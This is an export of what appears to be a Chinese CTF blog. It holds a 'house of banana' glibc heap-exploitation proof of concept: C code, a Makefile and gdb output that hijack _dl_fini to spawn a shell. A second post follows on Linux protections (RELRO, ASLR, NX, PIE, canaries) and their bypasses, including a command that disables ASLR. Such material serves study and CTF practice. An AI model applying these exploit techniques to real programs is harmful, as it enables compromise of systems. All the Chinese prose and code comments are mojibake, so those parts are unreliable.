<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">CC := gcc</span><br><span class="line">CFLAFS := -g </span><br><span class="line"></span><br><span class="line">all: house_of_banana large_bin_attack</span><br><span class="line"><span class="keyword">default</span>: house_of_banana  large_bin_attack</span><br><span class="line"></span><br><span class="line">TARGET := house_of_banana  large_bin_attack</span><br><span class="line"></span><br><span class="line">house_of_banana: house_of_banana.c </span><br><span class="line">	$(CC) $(CFLAFS) $^ -o $@</span><br><span class="line"></span><br><span class="line">large_bin_attack: large_bin_attack.c </span><br><span class="line">	$(CC) $(CFLAFS) $^ -o $@</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">	rm -f $(TARGET) </span><br></pre></td></tr></table></figure>

<p>house of banana</p>
<ul>
<li>ä¼ªé€ ç»“æ„ä½“ l_next ä¸º 0</li>
<li>l_init_called ä¸€ä¸ªæ¯”è¾ƒç¥å¥‡çš„æ•°å­—ï¼Œå…·ä½“çš„libcæ‰“å°</li>
<li>ubuntu 22.04 LTS æµ‹è¯•ä¸€ä¸‹ï¼Œåœ¨gdb ä¸‹å¯ä»¥æ‰§è¡Œä¸€ä¸ªå‘½ä»¤å°±ä¼šå´©æºƒã€‚</li>
<li>é«˜ç‰ˆæœ¬libc æ²¡æœ‰patchè¿›è¡Œæµ‹è¯•ï¼Œä½†æ˜¯æ ¹æ®æºç å¯è¡Œï¼ˆç†è®ºä¸Šï¼‰</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123; </span><br><span class="line">  <span class="built_in">execve</span>(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">get_libc_base</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">uint64_t</span> to;</span><br><span class="line">  <span class="type">uint64_t</span> from;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x400</span>];</span><br><span class="line"></span><br><span class="line">  FILE *file;</span><br><span class="line">  file = <span class="built_in">fopen</span>(<span class="string">&quot;/proc/self/maps&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">fgets</span>(buf, <span class="built_in">sizeof</span>(buf), file)) &#123;</span><br><span class="line">    <span class="comment">// printf(&quot;%s\n&quot;, buf);</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;libc.so.6&quot;</span>) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%lx-%lx&quot;</span>, &amp;from, &amp;to);</span><br><span class="line">      <span class="built_in">fclose</span>(file);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;libc =&gt; %#lx-%#lx\n&quot;</span>, from, to);</span><br><span class="line">      <span class="comment">// getchar();</span></span><br><span class="line">      <span class="keyword">return</span> from;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> libc_base = <span class="built_in">get_libc_base</span>();</span><br><span class="line">  <span class="type">uint64_t</span> rtld_global = libc_base + <span class="number">0x3fd040</span>;</span><br><span class="line">  <span class="comment">// &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span></span><br><span class="line">  <span class="type">uint64_t</span> *next_node = (<span class="type">uint64_t</span> *)(rtld_global - <span class="number">0x41ec8</span>);</span><br><span class="line">  <span class="type">uint64_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="type">uint64_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="type">uint64_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="type">uint64_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);  <span class="comment">// force p1 insert in to the largebin</span></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  p1[<span class="number">3</span>] = ((<span class="type">uint64_t</span>)next_node - <span class="number">0x20</span>);  <span class="comment">// push p2 into unsoteded bin</span></span><br><span class="line">  <span class="type">uint64_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);          <span class="comment">// force p2 insert in to the largebin</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// ç±»ä¼¼ä¸€ä¸ª uaf ä¿®æ”¹</span></span><br><span class="line">  <span class="type">uint64_t</span> fake = (<span class="type">uint64_t</span>)p2 - <span class="number">0x10</span>;  <span class="comment">// chunk_header</span></span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x28</span>) = fake;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x31c</span>) = <span class="number">0x4011d</span>;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x110</span>) = fake + <span class="number">0x40</span>;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x48</span>) = fake + <span class="number">0x58</span>;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x58</span>) = (<span class="type">uint64_t</span>)shell;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x120</span>) = fake + <span class="number">0x48</span>;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x50</span>) = <span class="number">0x8</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ä¿®æ”¹ _rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next çš„åœ°å€ä¸º p2</span></span><br><span class="line">  <span class="comment">// æœ€åä¸€ä¸ªlinkmapé“¾è¡¨éå† p2</span></span><br><span class="line">  <span class="comment">// å»ºè®® p *(struct link_map *) p2_addr çœ‹ä¸€ä¸‹</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// é—®é¢˜ï¼šassert i &lt; nloaded é”™è¯¯ï¼Œå› æ­¤è¦å°† (struct linkmap *p2) -&gt;l_next ç½®ä¸º0</span></span><br><span class="line">  p2[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// l_init_called ä¸º0</span></span><br><span class="line">  <span class="comment">// *(uint64_t*)(fake+0x31c) = 0x4011d; åƒæ˜¯ä¸€ä¸ªmagic number</span></span><br><span class="line">  <span class="comment">// å¿…é¡»ä¸ºå…¶ä½™ç±»å‹çš„å€¼ï¼Œå› æ­¤æ‰“å°å‡ºæ¥æ›¿æ¢</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// æœ€åçš„ç¨‹åºå´©æºƒäº†ğŸ˜¥.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    0x7ffff7fc9242 &lt;_dl_fini+514&gt;    nop    word ptr [rax + rax]</span></span><br><span class="line"><span class="comment">    0x7ffff7fc9248 &lt;_dl_fini+520&gt;    mov    qword ptr [rbp - 0x38], rax</span></span><br><span class="line"><span class="comment">  â–º 0x7ffff7fc924c &lt;_dl_fini+524&gt;    call   qword ptr [rax] &lt;shell&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  pwndbg&gt; bt</span></span><br><span class="line"><span class="comment">    #0  0x000055555555529b in shell () at house_of_banana.c:7</span></span><br><span class="line"><span class="comment">    #1  0x00007ffff7fc924e in _dl_fini () at ./elf/dl-fini.c:142</span></span><br><span class="line"><span class="comment">    #2  0x00007ffff7c45495 in __run_exit_handlers (status=0,</span></span><br><span class="line"><span class="comment">    # ...</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// ä½†æ˜¯å‘ç°åœ¨gdb è°ƒè¯•æƒ…å†µä¸‹å¯ä»¥æ‰§è¡Œä¸€æ¬¡å‘½ä»¤å°±ä¼šå´©æºƒ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; c</span></span><br><span class="line"><span class="comment">Continuing.</span></span><br><span class="line"><span class="comment">process 6591 is executing new program: /usr/bin/dash</span></span><br><span class="line"><span class="comment">Error in re-setting breakpoint 2: Function &quot;shell&quot; not defined.</span></span><br><span class="line"><span class="comment">[Thread debugging using libthread_db enabled]</span></span><br><span class="line"><span class="comment">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span></span><br><span class="line"><span class="comment">$ cat flag.txt</span></span><br><span class="line"><span class="comment">[Attaching after Thread 0x7ffff7fa7740 (LWP 6591) vfork to child process 6594]</span></span><br><span class="line"><span class="comment">[New inferior 2 (process 6594)]</span></span><br><span class="line"><span class="comment">[Thread debugging using libthread_db enabled]</span></span><br><span class="line"><span class="comment">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span></span><br><span class="line"><span class="comment">[Detaching vfork parent process 6591 after child exec]</span></span><br><span class="line"><span class="comment">[Inferior 1 (process 6591) detached]</span></span><br><span class="line"><span class="comment">process 6594 is executing new program: /usr/bin/cat</span></span><br><span class="line"><span class="comment">[Thread debugging using libthread_db enabled]</span></span><br><span class="line"><span class="comment">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span></span><br><span class="line"><span class="comment">flag&#123;house_of_banana_is_good&#125;</span></span><br><span class="line"><span class="comment">[Inferior 2 (process 6594) exited normally]</span></span><br><span class="line"><span class="comment">$ [5]  + 6580 suspended (tty output)  gdb house_of_banana</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="https://bbs.kanxue.com/thread-275968.htm">IO_FILE å…¥é—¨</a></li>
<li><a href="https://bbs.kanxue.com/thread-273895.htm">House of catæ–°å‹glibcä¸­IOåˆ©ç”¨æ‰‹æ³•è§£æ|å®‰å…¨æ‹›è˜|kanxue.com</a></li>
<li><a href="https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/">House of Apple ä¸€ç§æ–°çš„glibcä¸­IOæ”»å‡»æ–¹æ³•</a></li>
<li><a href="https://www.anquanke.com/post/id/222948">house of banana-å®‰å…¨å®¢</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>IO_FILE</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¨‹åºä¿æŠ¤æœºåˆ¶</title>
    <url>/2023/08/26/%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<blockquote>
<p>ç¨‹åºä¿æŠ¤æœºåˆ¶å­¦ä¹ </p>
</blockquote>
<span id="more"></span>

<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h3><h4 id="relro"><a href="#relro" class="headerlink" title="relro"></a>relro</h4><p>read only relocation: ç”±linkeræŒ‡å®šbinaryçš„ä¸€å—ç»è¿‡dynamic linkerå¤„ç†è¿‡ relocationä¹‹åçš„åŒºåŸŸä¸ºåªè¯».</p>
<ul>
<li>æ¯”å¦‚è¯´ gotè¡¨ï¼Œåœ¨å®Œå…¨å¼€å¯ååªè¯»ï¼Œæˆ‘ä»¬æ— æ³•ä¿®æ”¹ä¿®æ”¹å‡½æ•° got è¡¨çš„å†…å®¹ä»è€Œæ”¹å˜å‡½æ•°çš„æ‰§è¡Œè¿‡ç¨‹ã€‚</li>
</ul>
<p>gcc é€‰é¡¹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-z norelro   <span class="comment"># å…³é—­</span></span><br><span class="line">-z lazy      <span class="comment"># éƒ¨åˆ†å¼€å¯</span></span><br><span class="line">-z now       <span class="comment"># å®Œå…¨å¼€å¯</span></span><br></pre></td></tr></table></figure>

<h4 id="aslr"><a href="#aslr" class="headerlink" title="aslr"></a>aslr</h4><p>Address Space Layout Randomization, è¿™ç§æŠ€æœ¯ä½¿å¾—ç³»ç»Ÿä¸Šè¿è¡Œçš„è¿›ç¨‹çš„å†…å­˜åœ°å€æ— æ³•è¢«é¢„æµ‹ï¼Œä½¿å¾—ä¸è¿™äº›è¿›ç¨‹æœ‰å…³çš„æ¼æ´å˜å¾—æ›´åŠ éš¾ä»¥åˆ©ç”¨ã€‚é…åˆ PIE ä¿æŠ¤ä»è€Œå¾—åˆ°æœ€å¥½çš„æ•ˆæœ</p>
<p>Linuxä¸ŠASLRåˆ†ä¸º0&#x2F;1&#x2F;2ä¸‰çº§ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡å†…æ ¸å‚æ•°randomize_va_spaceè¿›è¡Œç­‰çº§æ§åˆ¶ï¼Œå¯¹åº”æ•ˆæœå¦‚ä¸‹ï¼š</p>
<ul>
<li>0ï¼šæ²¡æœ‰éšæœºåŒ–ï¼Œå³å…³é—­ASLR</li>
<li>1ï¼šä¿ç•™çš„éšæœºåŒ–ï¼Œå³<strong>å…±äº«åº“ã€æ ˆã€mmap()ä»¥åŠVSDOå°†è¢«éšæœºåŒ–</strong></li>
<li>2ï¼šå®Œå…¨çš„éšæœºåŒ–ï¼Œåœ¨1çš„åŸºç¡€ä¸Šï¼Œ<strong>é€šè¿‡brkåˆ†é…çš„å†…å­˜ç©ºé—´(heapé€šè¿‡æ­¤ç³»ç»Ÿè°ƒç”¨è·å¾—)ä¹Ÿå°†éšæœºåŒ–</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cat</span>  /proc/sys/kernel/randomize_va_space</span><br><span class="line">  2</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>

<p>åœ¨ä½¿ç”¨ gdb è½¯ä»¶è°ƒè¯•æ—¶å¯ä»¥å…³é—­æ­¤ä¿æŠ¤ï¼Œä»è€Œåœ¨è°ƒè¯•æ—¶è·å¾—çš„åœ°å€ä¸€è‡´ã€‚</p>
<p>å› ä¸ºå­˜åœ¨ä¸€å®šçš„åœ°å€éšæœºåŒ–ï¼Œæ‰€ä»¥åœ¨æ¼æ´åˆ©ç”¨æ—¶ä¸èƒ½ä½¿ç”¨å›ºå®šçš„å‡½æ•°åœ°å€ã€‚æ¯”å¦‚æ²¡å¼€ aslr ä¿æŠ¤systemå‡½æ•°(å…±äº«åº“ä¸­çš„å‡½æ•°)åœ°å€æ˜¯ 0x1234ã€‚å¼€å¯aslræ—¶systemå‡½æ•°ä½ç½®ä¼šæ”¹å˜ï¼Œä»è€Œåˆ©ç”¨å¤±è´¥ã€‚</p>
<h4 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h4><p>No-eXecute ä¸å¯æ‰§è¡Œã€‚å’ŒDEP(Data Execute Protector)ä¸€è‡´</p>
<p>å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥shellcodeæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚</p>
<p>gccå‚æ•°</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-z execstack    <span class="comment"># æ ˆå¯æ‰§è¡Œ</span></span><br><span class="line">-z noexecstack  <span class="comment"># å¼€å¯</span></span><br></pre></td></tr></table></figure>

<p>bypass: æœç»äº†ä¸€å®šå†™shellcodeçš„åˆ©ç”¨ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨**ROP(Return-oriented programming)**æ¥bypassï¼Œé€ æˆæˆ‘ä»¬æƒ³è¦çš„æ”»å‡»æ•ˆæœã€‚</p>
<h4 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h4><p>Position independent code, ä½ç½®æ— å…³ä»£ç ï¼Œé»˜è®¤å¼€å¯ã€‚<br>é’ˆå¯¹ä»£ç æ®µ.text, æ•°æ®æ®µï¼Œ.dataï¼Œ.bssç­‰å›ºå®šåœ°å€çš„ä¸€ä¸ªé˜²æŠ¤æŠ€æœ¯ã€‚åŒASLRä¸€æ ·ï¼Œåº”ç”¨äº†PIEçš„ç¨‹åºä¼šåœ¨æ¯æ¬¡åŠ è½½æ—¶éƒ½å˜æ¢åŠ è½½åŸºå€ï¼Œä»è€Œä½¿ä½äºç¨‹åºæœ¬èº«çš„gadgetä¹Ÿå¤±æ•ˆ</p>
<p>æ²¡æœ‰PIEä¿æŠ¤çš„ç¨‹åºï¼Œæ¯æ¬¡åŠ è½½çš„åŸºå€éƒ½æ˜¯å›ºå®šçš„ï¼Œ64ä½ä¸Šä¸€èˆ¬æ˜¯0x400000ã€‚</p>
<p>gcc å‚æ•°</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-no-pie    <span class="comment"># å…³é—­pie</span></span><br><span class="line">-pie       <span class="comment"># å¼€å¯pie</span></span><br></pre></td></tr></table></figure>

<p>å¼€å¯aslrï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—textæ®µçš„gadgetï¼Œå¹¶ä¸”å¯ä»¥ä½¿ç”¨ã€‚ä½†æ˜¯å¼€å…¶pieä¿æŠ¤åï¼ŒtextéšæœºåŒ–ï¼Œæˆ‘ä»¬å¯»æ‰¾çš„gadgetä¹Ÿéœ€è¦åŠ ä¸Šä¸€ä¸ªåç§»æ‰èƒ½ä½¿ç”¨ã€‚</p>
<ul>
<li>bypass<ul>
<li>partial write: ç”±äºå†…å­˜çš„é¡µè½½å…¥æœºåˆ¶ï¼ŒPIEçš„éšæœºåŒ–åªèƒ½<strong>å½±å“åˆ°å•ä¸ªå†…å­˜é¡µ</strong>ã€‚é€šå¸¸æ¥è¯´ï¼Œä¸€ä¸ªå†…å­˜é¡µå¤§å°ä¸º0x1000ï¼Œè¿™å°±æ„å‘³ç€ä¸ç®¡åœ°å€æ€ä¹ˆå˜ï¼ŒæŸæ¡æŒ‡ä»¤çš„å12ä½æ˜¯å§‹ç»ˆä¸å˜çš„ã€‚å› æ­¤é€šè¿‡è¦†ç›–éƒ¨åˆ†å†…å®¹æ¯”å¦‚å8ä½ä»è€ŒåŠ«æŒå‡½æ•°æ‰§è¡Œæµã€‚<ul>
<li>leak: ç¨‹åºæœ¬èº«çš„æ¼æ´å¯ä»¥æ³„éœ²æŸäº›å‡½æ•°åœ°å€ï¼Œä»è€Œè·å¾—ç¨‹åºåŠ è½½çš„åŸºåœ°å€ã€‚</li>
</ul>
</li>
<li>vdso&#x2F;vsyscall: ç³»ç»ŸæŠŠå‡ ä¸ªå¸¸ç”¨çš„æ— å‚å†…æ ¸è°ƒç”¨ä»å†…æ ¸ä¸­æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´ä¸­ï¼Œè¿™å°±æ˜¯vsyscallã€‚åœ¨æŸäº›ç‰ˆæœ¬ä¸­ï¼Œè¿™ä¸ªåœ°å€ä¸ä¼šæ”¹å˜ï¼Œå¹¶ä¸”ä¸å—ä¿æŠ¤çš„å½±å“ã€‚vsyscall å†…å­˜é¡µä¸­åŒ…å«äº†ä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨ã€‚è€Œä¸”è¿™ä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨å¯¹ç¨‹åºè¿è¡ŒåŸºæœ¬æ²¡æœ‰å½±å“ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è·å¾—äº†ä¸‰ä¸ªå·²çŸ¥åœ°å€çš„ retã€‚ç›¸å½“å¯ä»¥æ‰§è¡Œ <code>ret</code> æŒ‡ä»¤ï¼Œè·å¾—ï¼šæŸ¥çœ‹ç¨‹åºçš„æ˜ å°„ <code>cat /proc/&lt;pid&gt;/maps</code>ã€‚</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__vsyscall_page:</span><br><span class="line"> mov $__NR_gettimeofday, %rax</span><br><span class="line"> syscall</span><br><span class="line"> ret</span><br><span class="line"></span><br><span class="line"> .balign <span class="number">1024</span>, <span class="number">0xcc</span></span><br><span class="line"> mov $__NR_time, %rax</span><br><span class="line"> syscall</span><br><span class="line"> ret</span><br><span class="line"></span><br><span class="line"> .balign <span class="number">1024</span>, <span class="number">0xcc</span></span><br><span class="line"> mov $__NR_getcpu, %rax</span><br><span class="line"> syscall</span><br><span class="line"> ret</span><br></pre></td></tr></table></figure>

<h4 id="stack-canary"><a href="#stack-canary" class="headerlink" title="stack canary"></a>stack canary</h4><p>å½“å¯ç”¨ canary ä¿æŠ¤åï¼Œå‡½æ•°å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ä¼šå…ˆå¾€æ ˆé‡Œ<strong>æ’å…¥ cookie ä¿¡æ¯</strong>ï¼Œå½“å‡½æ•°çœŸæ­£è¿”å›çš„æ—¶å€™ä¼šéªŒè¯cookieä¿¡æ¯æ˜¯å¦åˆæ³•ï¼Œå¦‚æœä¸åˆæ³•å°±åœæ­¢ç¨‹åºè¿è¡Œã€‚æ”»å‡»è€…åœ¨æ ˆæº¢å‡ºè¦†ç›–è¿”å›åœ°å€çš„æ—¶å€™å¾€å¾€ä¹Ÿä¼šå°†cookieä¿¡æ¯ç»™è¦†ç›–æ‰ï¼Œå¯¼è‡´æ ˆä¿æŠ¤æ£€æŸ¥å¤±è´¥è€Œé˜»æ­¢shellcodeçš„æ‰§è¡Œã€‚åœ¨Linuxä¸­æˆ‘ä»¬å°†cookieä¿¡æ¯ç§°ä¸ºcanaryã€‚</p>
<p>Linux canary æœ€åä¸€å­—èŠ‚ä¸º <code>\x00</code></p>
<p>gcc å¼€å¯å’Œå…³é—­çš„å‚æ•°</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-fno-stack-protector   <span class="comment"># å…³é—­ï¼Œé»˜è®¤æ²¡æœ‰canary</span></span><br><span class="line"></span><br><span class="line">-fstack-protector          <span class="comment"># ä¿æŠ¤å‡½æ•°ä¸­é€šè¿‡alloca()åˆ†é…ç¼“å­˜ä»¥åŠå­˜åœ¨å¤§äº8å­—èŠ‚çš„bufferã€‚ä¿æŠ¤èƒ½åŠ›æœ‰é™ï¼Œä¸ä¼šä¿æŠ¤æ‰€æœ‰çš„å‡½æ•°</span></span><br><span class="line">-fstack-protector-all      <span class="comment"># å¯ç”¨å †æ ˆä¿æŠ¤ï¼Œä¸ºæ‰€æœ‰å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç </span></span><br><span class="line">-fstack-protector-strong   <span class="comment"># ç¼–è¯‘å‚æ•°è®©ä¿æŠ¤çš„èŒƒå›´æ›´å¹¿</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹è¿™ç³»åˆ—æ–‡ç« ã€‚åŠ æ·±å¯¹canaryç†è§£ï¼š<a href="https://zhuanlan.zhihu.com/p/434821566">Linuxå†…æ ¸çš„FSGSBASEç‰¹æ€§</a></p>
<p>Linux x86-64ä¸‹çš„fs&#x2F;gsæ®µå¯„å­˜å™¨ï¼Ÿ</p>
<ul>
<li><strong>ç”¨æˆ·æ€ä½¿ç”¨fså¯„å­˜å™¨å¼•ç”¨çº¿ç¨‹çš„glibc TLS(TLSå…¨ç§°Thread Local Storage)å’Œçº¿ç¨‹åœ¨ç”¨æˆ·æ€çš„stack canaryï¼›ç”¨æˆ·æ€çš„glibcä¸ä½¿ç”¨gså¯„å­˜å™¨ï¼›åº”ç”¨å¯ä»¥è‡ªè¡Œå†³å®šæ˜¯å¦ä½¿ç”¨è¯¥å¯„å­˜å™¨ã€‚</strong></li>
<li><strong>å†…æ ¸æ€ä½¿ç”¨gså¯„å­˜å™¨å¼•ç”¨percpuå˜é‡å’Œè¿›ç¨‹åœ¨å†…æ ¸æ€çš„stack canaryï¼›å†…æ ¸æ€ä¸ä½¿ç”¨fså¯„å­˜å™¨ã€‚</strong></li>
</ul>
<p>é»˜è®¤stack canaryä½¿ç”¨å…¨å±€ç¬¦å·å˜é‡ __stack_chk_guard(fs:0x28) ä½œä¸ºåŸå§‹çš„canary, åœ¨gcc&#x2F;clangä¸­å‡ä½¿ç”¨ç›¸åŒçš„åå­—</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *tcb;		<span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">			   thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="type">dtv_t</span> *dtv;</span><br><span class="line">  <span class="type">void</span> *self;		<span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> multiple_threads;</span><br><span class="line">  <span class="type">int</span> gscope_flag;</span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> unused_vgetcpu_cache[<span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bit 0: X86_FEATURE_1_IBT.</span></span><br><span class="line"><span class="comment">     Bit 1: X86_FEATURE_1_SHSTK.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> feature_1;</span><br><span class="line">  <span class="type">int</span> __glibc_unused1;</span><br><span class="line">  <span class="comment">/* Reservation of some values for the TM ABI.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_tm[<span class="number">4</span>];</span><br><span class="line">  <span class="comment">/* GCC split stack support.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_ss;</span><br><span class="line">  <span class="comment">/* The marker for the current shadow stack.  */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ssp_base;</span><br><span class="line">  <span class="comment">/* Must be kept even if it is no longer used by glibc since programs,</span></span><br><span class="line"><span class="comment">     like AddressSanitizer, depend on the size of tcbhead_t.  */</span></span><br><span class="line">  __128bits __glibc_unused2[<span class="number">8</span>][<span class="number">4</span>] __attribute__ ((<span class="built_in">aligned</span> (<span class="number">32</span>)));</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *__padding[<span class="number">8</span>];</span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure>

<p>per-cpu å˜é‡çš„å¼•å…¥æ˜¯ä¸ºäº†å®ç°per-taskçš„stack canary, æ¯ä¸ªcpuä¸ŠåŒæ—¶åªèƒ½è¿è¡Œä¸€ä¸ªè¿›ç¨‹&#x2F;çº¿ç¨‹, per cpuå˜é‡å¯ä»¥éšè¿›ç¨‹çš„åˆ‡æ¢è€Œåˆ‡æ¢ï¼Œæ•…é€šè¿‡ä¸€ä¸ªper-cpuå˜é‡å®Œå…¨å¯ä»¥ä¸ºæ¯ä¸ªè¿›ç¨‹&#x2F;çº¿ç¨‹è§£å¼•ç”¨åˆ°ä¸åŒçš„canaryåœ°å€(åç»­ç§°ä¸ºper-cpu canary),ä»¥å®ç°per-taskçš„canary.</p>
<h3 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h3><h4 id="kaslr"><a href="#kaslr" class="headerlink" title="kaslr"></a>kaslr</h4><p>kernel address space layout randomize</p>
